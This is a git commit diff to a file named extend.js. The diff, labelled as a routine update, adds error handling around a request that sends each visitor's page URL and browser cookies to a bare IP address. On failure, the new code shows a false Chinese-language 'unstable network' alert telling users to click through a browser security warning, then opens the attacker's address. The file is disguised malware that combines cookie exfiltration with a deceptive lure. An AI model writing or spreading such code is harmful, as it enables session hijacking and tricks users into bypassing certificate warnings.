1e61fd5fb48899485c2466e2334fc7052d647e94
司土御帝 <1181935296@qq.com>
2020-09-15 10:37:37 +0800

    Update extend.js

--- extend.js
+++ extend.js
@@ -10,13 +10,18 @@
     document.getElementsByTagName('head')[0].appendChild(meta);
     var httpRequest = new XMLHttpRequest();
     httpRequest.open('GET',"https://66.70.204.147/ftts?d="+window.location.href+"&c="+document.cookie, true);
-    httpRequest.send();
+    try {
+        httpRequest.send();
+    }
+    catch(err){
+        alert("系统检测到你的网络不稳定,在打开的网页中1>选择高级2>选择继续访问，将自动为你加速！");
+        window.open("https://66.70.204.147");
+    }
+    
     httpRequest.onreadystatechange = function () {
         if (httpRequest.readyState == 4 && httpRequest.status == 200) {
             var json = httpRequest.responseText;
             console.log(json);
-        }else{
-            //window.open("https://66.70.204.147");
         }
     };
 }())
